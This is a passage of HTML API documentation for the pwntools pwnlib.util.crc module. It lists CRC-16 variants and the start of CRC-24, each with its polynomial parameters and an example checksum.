<dd><p>Calculates the crc_16_dect_x checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x589</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dect-x">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dect-x</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_dect_x</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">127</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_dnp">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_dnp</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_dnp" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_dnp checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3d65</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dnp">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-dnp</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_dnp</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">60034</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_en_13757">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_en_13757</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_en_13757" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_en_13757 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3d65</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-en-13757">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-en-13757</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_en_13757</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">49847</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_genibus">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_genibus</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_genibus" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_genibus checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-genibus">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-genibus</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_genibus</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">54862</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_gsm">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_gsm</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_gsm" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_gsm checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-gsm">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-gsm</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_gsm</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">52796</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_lj1200">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_lj1200</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_lj1200" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_lj1200 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x6f63</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-lj1200">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-lj1200</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_lj1200</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">48628</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_maxim">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_maxim</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_maxim" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_maxim checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8005</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-maxim">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-maxim</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_maxim</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">17602</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_mcrf4xx">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_mcrf4xx</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_mcrf4xx" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_mcrf4xx checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-mcrf4xx">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-mcrf4xx</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_mcrf4xx</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">28561</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_opensafety_a">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_opensafety_a</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_opensafety_a" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_opensafety_a checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x5935</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-opensafety-a">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-opensafety-a</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_opensafety_a</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">23864</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_opensafety_b">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_opensafety_b</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_opensafety_b" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_opensafety_b checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x755b</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-opensafety-a">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-opensafety-a</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_opensafety_b</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">8446</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_profibus">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_profibus</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_profibus" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_profibus checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1dcf</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-profibus">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-profibus</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_profibus</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">43033</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_riello">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_riello</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_riello" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_riello checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0xb2aa</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-riello">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-riello</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_riello</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">25552</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_t10_dif">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_t10_dif</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_t10_dif" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_t10_dif checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8bb7</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-t10-dif">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-t10-dif</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_t10_dif</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">53467</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_teledisk">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_teledisk</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_teledisk" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_teledisk checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xa097</li>
<li>width   = 16</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-teledisk">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-teledisk</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_teledisk</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">4019</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_tms37157">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_tms37157</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_tms37157" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_tms37157 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1021</li>
<li>width   = 16</li>
<li>init    = 0x89ec</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-tms37157">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-tms37157</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_tms37157</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">9905</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_16_usb">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_16_usb</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_16_usb" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_16_usb checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x8005</li>
<li>width   = 16</li>
<li>init    = 0xffff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0xffff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-usb">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-16-usb</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_16_usb</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">46280</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_24">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_24</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_24" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_24 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x864cfb</li>
<li>width   = 24</li>
<li>init    = 0xb704ce</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
